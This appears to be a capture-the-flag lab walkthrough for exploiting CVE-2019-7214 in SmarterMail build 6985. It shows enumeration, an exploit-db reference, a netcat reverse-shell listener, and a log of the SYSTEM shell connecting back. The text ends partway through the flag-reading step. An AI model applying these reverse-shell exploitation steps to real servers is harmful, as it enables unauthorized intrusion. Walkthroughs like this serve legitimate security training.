# About

In this lab, we will exploit a remote code execution vulnerability in build 6985 of the SmarterMail application. This exercise enhances your skills in identifying and exploiting vulnerabilities for gaining access to systems.

# Summary

This lab demonstrates exploiting a remote code execution vulnerability in SmarterMail build 6985 to gain SYSTEM-level access on a Windows server. Learners will identify the application version, leverage an RCE exploit, and use a reverse shell payload to compromise the target. This lab emphasizes web application exploitation and highlights the risks of unpatched software.

---

## Learning Objectives

**After completion of this lab, learners will be able to:**

- Enumerate open ports and services to identify the SmarterMail application running on port 9998.
- Confirm the application version and search for applicable exploits.
- Deploy the SmarterMail RCE exploit with a reverse shell payload.
- Verify SYSTEM-level access upon successful exploitation.
- Understand the importance of applying patches to mitigate known vulnerabilities.

## Basic Enumeration

- Anonymous FTP login is enabled, allowing unauthenticated access.

```bash
ftp 192.168.53.65
Connected to 192.168.53.65.
220 Microsoft FTP Service
Name (192.168.53.65:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
```

**Note: No sensitive data was found in the accessible FTP directories.(Rabbit Hole)**

- Port 80 is just a windows IIS page.
- Port 9998 is a login page.

---

## Port 9998 Enumeration

- Opening port 9998 in browser redirects to http://192.168.53.65:9998/interface/root#/login.
- Which is a login page belongs to **smartmailer**.
- Researching exploits for SmarterMail on Google we come across an interesting exploit.
- Exploit link https://www.exploit-db.com/exploits/49216

## Exploiting CVE-2019-7214 to get initial access

- Looking at the `nmap` results from earlier we do have .NET remoting running on port 17001. As such this exploit should be applicable to the target machine.
- Exploit configuration . We just need to update target ip (HOST) and our machine ip (LHOST) in the script.
- Then we need to start a netcat listener to get reverse shell.

```bash
nc -lvnp 4444
```

- After starting the listener, we can execute the exploit to get reverse shell.

```bash
python3 49216
```
- We will get the shell in our netcat listener as **Administrator**

```bash
nc -lvnp 4444 
listening on [any] 4444 ...
connect to [192.168.49.53] from (UNKNOWN) [192.168.53.65] 49906
bash -i
PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> 
```

## Flag Extraction

- Now we can just navigate to **C:\Users\Administrator\Desktop** and read the flag inside **proof.txt** file.

```bash
PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----
